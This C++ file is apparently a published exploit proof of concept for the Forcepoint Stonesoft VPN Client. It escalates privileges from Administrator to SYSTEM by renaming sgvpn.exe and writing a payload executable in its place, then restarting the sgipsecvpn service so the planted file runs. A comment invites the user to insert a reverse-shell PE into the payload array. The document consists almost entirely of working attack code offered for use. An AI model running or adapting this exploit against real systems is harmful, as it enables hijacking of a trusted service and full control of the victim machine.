/*
# Exploit Author : TOUHAMI KASBAOUI
# Vendor Homepage : https://www.forcepoint.com/
# Version : 6.2.0 / 6.8.0
# Tested on : Windows 10
# CVE : N/A
#Description local privilege escalation vertical from Administrator to NT AUTHORITY\SYSTEM
*/

#define UNICODE
#define _UNICODE
#include <Windows.h>
#include <iostream>

using namespace std;
enum Result
{
    unknown,
    serviceManager_AccessDenied,
    serviceManager_DatabaseDoesNotExist,
    service_AccessDenied,
    service_InvalidServiceManagerHandle,
    service_InvalidServiceName,
    service_DoesNotExist,
    service_Exist
};

Result ServiceExists(const std::wstring& serviceName)
{
    Result r = unknown;

    SC_HANDLE manager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, GENERIC_READ);

    if (manager == NULL)
    {
        DWORD lastError = GetLastError();

        if (lastError == ERROR_ACCESS_DENIED)
            return serviceManager_AccessDenied;
        else if (lastError == ERROR_DATABASE_DOES_NOT_EXIST)
            return serviceManager_DatabaseDoesNotExist;
        else
            return unknown;
    }

    SC_HANDLE service = OpenService(manager, serviceName.c_str(), GENERIC_READ);

    if (service == NULL)
    {
        DWORD error = GetLastError();

        if (error == ERROR_ACCESS_DENIED)
            r = service_AccessDenied;
        else if (error == ERROR_INVALID_HANDLE)
            r = service_InvalidServiceManagerHandle;
        else if (error == ERROR_INVALID_NAME)
            r = service_InvalidServiceName;
        else if (error == ERROR_SERVICE_DOES_NOT_EXIST)
            r = service_DoesNotExist;
        else
            r = unknown;
    }
    else
        r = service_Exist;

    if (service != NULL)
        CloseServiceHandle(service);

    if (manager != NULL)
        CloseServiceHandle(manager);

    return r;
}

bool ChangeName() {
    LPCWSTR parrentvpnfilename = L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn.exe";
    LPCWSTR newName = L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn_old.exe";
    bool success = MoveFile(parrentvpnfilename, newName);
    if (success) {
        cerr << "[+] SGVPN filename changed.\n";
    }
    else {
        cerr << "Failed to rename file \n";
    }
    return 0;
}

int main() {

    const uint8_t payload[7168] = {
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }; //You can set array bin of your reverse shell PE file here

    std::wstring serviceName = L"sgipsecvpn";
    Result result = ServiceExists(serviceName);
    if (result == service_Exist)
        std::wcout << L"The VPN service '" << serviceName << "' exists." << std::endl;
    else if (result == service_DoesNotExist)
        std::wcout << L"The service '" << serviceName << "' does not exist." << std::endl;
    else
        std::wcout << L"An error has occurred, and it could not be determined whether the service '" << serviceName << "' exists or not." << std::endl;
    ChangeName();
    HANDLE fileHandle = CreateFile(L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    cerr << "[*] Loading Malicious file into main PE of Forcepoint Installer \n";
    if (fileHandle == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create payload\n";
        return 1;
    }

    DWORD bytesWritten;
    if (!WriteFile(fileHandle, payload, sizeof(payload), &bytesWritten, NULL)) {
        cerr << "Failed to write to file\n";
        CloseHandle(fileHandle);
        return 1;
    }
    CloseHandle(fileHandle);

    cout << "[+] Payload exported to ForcePointVPN \n";
    Sleep(30);
    cout << "[+] Restart ForcePointVPN Service \n";
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE serviceHandle = OpenService(scmHandle, TEXT("sgipsecvpn"), SERVICE_ALL_ACCESS);

    SERVICE_STATUS serviceStatus;
    QueryServiceStatus(serviceHandle, &serviceStatus);
    if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus);
        while (serviceStatus.dwCurrentState != SERVICE_STOPPED) {
            QueryServiceStatus(serviceHandle, &serviceStatus);
            Sleep(1000);
        }
    }
    StartService(serviceHandle, NULL, NULL);

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    return 0;
}